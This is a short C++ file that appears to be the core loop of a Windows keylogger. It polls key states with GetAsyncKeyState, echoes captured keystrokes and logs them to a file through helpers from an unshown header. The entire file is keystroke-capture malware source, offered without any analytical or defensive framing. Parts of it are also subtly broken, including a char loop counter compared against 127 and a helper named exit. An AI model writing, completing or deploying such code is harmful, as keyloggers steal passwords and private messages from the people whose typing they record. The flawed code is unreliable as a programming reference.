#include "key69.h"


int main() {
	char key;
	
	while(true) {
		
		for (key = 0; key <=127; key++) {
			
			if (GetAsyncKeyState(key)==-32767) {

				if (exit(key)) {
					return 0;
				}
				if (xxx(key) == FALSE) {

					cout << key << " ";
					twofile(key);
				}
				if (clear(key)) {
					cfile();
					cout << "\nFile Cleared" << endl;
				}

			

			
			}
			
		}
	}
	

}
